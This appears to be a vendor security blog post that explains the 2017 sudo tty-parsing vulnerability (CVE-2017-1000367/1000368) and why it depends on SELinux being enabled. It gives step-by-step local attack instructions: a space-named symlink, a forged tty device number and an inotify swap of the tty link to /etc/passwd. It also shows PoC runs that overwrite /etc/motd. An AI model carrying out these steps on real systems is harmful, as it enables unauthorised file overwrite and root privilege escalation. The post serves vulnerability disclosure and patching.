+++
date = "2017-06-24T02:33:08+09:00"
title = "sudo vulnerability detail with SELinux(CVE-2017-1000367/CVE-2017-1000368)"
draft = false

+++

There's much misunderstanding about  "sudo" vulnerability(CVE-2017-1000367/1000368) that "SELinux caused some vuulnerable". On this blog, we will describe details about tha vulnerability and why it is depending on SELinux.

(Written by Kazuki Omo:ka-omo@sios.com).

## Vulnerability Details

You can easy to find the details of "what is the vulnerability" on Qualys Security Advisory(http://www.openwall.com/lists/oss-security/2017/05/30/16).

Actually, this vulnerability is completely comes from "sudo" source code.

As the description on above Qualys Security Advisory, main problem is "sudo behaivor when he get space-contained command".

When someone run sudo, sudo program will get user information(user_info: uid, cwd, etc.) by calling get_user_info(). And get_user_info() will call sudo_ttyname_dev()->sudo_ttyname_scan() for device "breadth-first scan". During the sudo_ttyname_scan(), it will obtain "tty number for that process running" by 7th field on "/proc/[pid]/stat".
 
  ex.  When you run mlayer on /dev/pts/0(tty) as pid=2778:
        
        jsossug@cent7enc:~$ cat /proc/2778/stat
        2778 (mplayer) S 2366 2778 2366 34816 2778 1077936128 10433 ....
        
  1.  From above output, "34816" is the dev number. 

  2.  "34816"(Dec) -> "0000 0000 0000 0000 1000 1000 0000 0000"(BN). Maigor number is "31-20 bit + 7-0 bit". Minor number is "19-8" bit. Then Major number is "000010001000 = 136", and Minor number is "0000 0000 0000 0000 = 0".
      .

  3.  For the confirmation, check "ls -l /dev/pts/0" output;

        jsossug@cent7enc:~$ ls -l /dev/pts/0
        crw--w---- 1 jsossug tty 136, 0 Jun 22 12:49 /dev/pts/0

  4.  From above output, you can see "136,0" which is "Major, Minor" number.
       

The problem is /proc/[pid]/stat file is "space-separated" output. So, if someone run "cmd" which contain space, sudo_ttyname_scan() will treat other field as tty name(this is mainly bug).

When Malicious attacker will run cmd with 6-spaces, he can easy to change tty number to any number. And if he can change that tty's symbolic link to file, and treat that file as stdout, he can overwrite that file whatever he wants.
For this sequence, attacker can use sudo's SELinux implementation.

## How to attack

Here is the steps for attacking;

  1.  Create /dev/shm/_tmp which is world-writable directory.

        jsossug@cent7enc:/dev/shm$ mkdir _tmp

  2.  Create symbolic link "/dev/shm/_tmp/tty" as non-existent pts "/dev/pts/57".

        jsossug@cent7enc:/dev/shm$ ln -s /dev/pts/57 /dev/shm/_tmp/tty
        jsossug@cent7enc:/dev/shm$ ls -l /dev/shm/_tmp
        lrwxrwxrwx. 1 jsossug jsossug 11  Jun 22 09:02 tty -> /dev/pts/57

  3.  "/dev/pts/57" device number will be "34873" as above explanation. So, create symbolic link "/dev/shm/_tmp/      34873" for "/usr/bin/sudo".

        [jsossug@cent7enc _tmp]$ ln -s /usr/bin/sudo "/dev/shm/_tmp/     34873 "
        [jsossug@cent7enc _tmp]$ ls -l
        lrwxrwxrwx. 1 jsossug jsossug 13  Jun 22 09:07      34873  -> /usr/bin/sudo

  4.  Use inotify for monitoring IN_OPEN on /dev/shm/_tmp directory. When /dev/shm/_tmp directory is accessed, change /dev/shm/_tmp/_tty to file which you want to overwrite(/etc/passwd, for example).

* * *

## So, how SELinux is involved on this vulnerability?
   
On above step 4, sudo program will think his tty is "/dev/shm/_tmp" which is linked to "/etc/passwd".

  5. If SELinux is enabled on the system**(doesn't matter Enforcing or Permissive)**, and "-r Role" option is specified , exec_setup() in sudo will call selinux_setup();

        bool
        exec_setup(struct command_details *details, const char *ptyname, int ptyfd)
        {
        --snip-- 
        #ifdef HAVE_SELINUX
            if (ISSET(details->flags, CD_RBAC_ENABLED)) {
                if (selinux_setup(details->selinux_role, details->selinux_type,
                    ptyname ? ptyname : user_details.tty, ptyfd) == -1)
                    goto done;
            }
        #endif

  6. selinux_setup() will call relabel_tty() for relabeling the tty;

        int
        selinux_setup(const char *role, const char *type, const char *ttyn,
            int ptyfd)
        {
        --snip--
            if (relabel_tty(ttyn, ptyfd) < 0) {
                warning(_("unable to setup tty context for %s"), se_state.new_context);
                goto done;
            }

  7. During the relabel_tty(), program will re-open ttyn which is now "/etc/passwd".
        --snip--
                /* Re-open tty to get new label and reset std{in,out,err} */
                close(se_state.ttyfd);
                se_state.ttyfd = open(ttyn, O_RDWR|O_NONBLOCK);
        --snip--

      And call dup2(se_state.ttyfd, ptyfd) for duplicating fd. 

        --snip--
                        for (fd = STDIN_FILENO; fd <= STDERR_FILENO; fd++) {
                            if (isatty(fd) && dup2(se_state.ttyfd, fd) == -1) {
        --snip--

      Then stdin/stdout/stderr will be set as /etc/passwd. So now the "cmd" stdout/stderr will be /etc/passwd, then you can overwrite /etc/passwd if you control the cmd output!!

* * *

## PoC with SELinux enabled.
PoC is available on the Internet. In here, we use /etc/motd(only root can write) for attack file. And use "/usr/bin/sum" for the command, then add /usr/bin/sum as permitted command for "sudovul(test user)".

        sudovul	ALL=(ALL)NOPASSWD:/usr/bin/sum

  1.  Confirm SELinux is Permissive mode;
        
        sudovul@cent7enc:~# getenforce
        Permissive
        

  2.  Run PoC on localhost as sudovul;
        
         [sudovul@cent7enc sudo-CVE-2017-1000367]$ ./sudopwn
         [sudovul@cent7enc sudo-CVE-2017-1000367]$ cat /etc/motd
         /usr/bin/sum: unrecognized option '--
         HELLO
         WORLD
         '
         Try '/usr/bin/sum --help' for more information.

  3.  Change SELinux to Enforcing mode;
        
        sudovul@cent7enc:~# getenforce
        Enforcing
        

  2.  Clear /etc/motd and run PoC on localhost as sudovul;
        
         [sudovul@cent7enc sudo-CVE-2017-1000367]$ ./sudopwn
         [sudovul@cent7enc sudo-CVE-2017-1000367]$ cat /etc/motd
         /usr/bin/sum: unrecognized option '--
         HELLO
         WORLD
         '
         Try '/usr/bin/sum --help' for more information.

So, we can overwrite /etc/motd in SELinux Permissive/Enforcing Mode.

* * *
## PoC with SELinux Disabled

  1. set SELinux as Disabled in /etc/selinux/config, and reboot.

        root@cent7enc:~# getenforce
        Disabled

  2. Clear /etc/motd, and run PoC code again. 

        [sudovul@cent7enc sudo-CVE-2017-1000367]$ ./sudopwn
        /usr/bin/sum: unrecognized option '--
        HELLO
        WORLD
        '
        Try '/usr/bin/sum --help' for more information.

  3. Check /etc/motd is not modified.

        [sudovul@cent7enc sudo-CVE-2017-1000367]$ cat /etc/motd
        [sudovul@cent7enc sudo-CVE-2017-1000367]$ 

* * *
## Conclusion

From above Vulnerability details and PoC, we can say;

1. The main vulnerability is coming from sudo.
2. SELinux is not exactlly used for the attack. Sudo will open tty and dup the fd for relabeling tty(malicious user can use it for attack).
3. This Vulnerablity condition is **SELinux Enabled(not only Enforcing, but also Permissive.)**. For fixing the problem, update sudo package. 
